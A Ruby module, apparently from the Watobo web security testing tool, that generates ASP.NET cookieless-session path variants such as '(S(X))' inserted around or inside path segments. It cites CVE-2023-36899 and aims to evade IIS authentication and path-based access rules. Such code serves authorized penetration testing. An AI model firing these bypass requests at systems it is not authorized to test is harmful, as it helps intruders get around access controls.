module Watobo::EvasionHandlers
  # https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/
  #
  class Cookieless < EvasionHandlerBase

    prio 4

    def sample(path, &block)
      elements = path.gsub(/^\//, '').split('/')
      elements.each_with_index do |p, i|

        element = p
        # puts "* #{element}"
        samples = []
        samples << "#{element}/(S(X))"
        samples << "(S(X))/#{element}"
        if element.length > 1
          mi = element.length / 2
          samples << "#{element[0, mi]}(S(X))#{element[mi..-1]}"
        end

        samples.each do |sample|
          # puts "Sample: #{sample} @ #{i}"
          new_path_elements = elements[0...i]

          new_path_elements << sample
          if i < elements.length - 1
            new_path_elements.concat elements[i + 1..-1]
          end
          # puts File.join(new_path_elements)
          yield File.join(new_path_elements) if block_given?
          # puts '---'
        end

      end

    end

    def run(request, &block)

      path_orig = request.path_ext
      sample(path_orig) do |sample_path|
        test = request.clone
        test.path = sample_path

        yield test
      end

    end
  end
end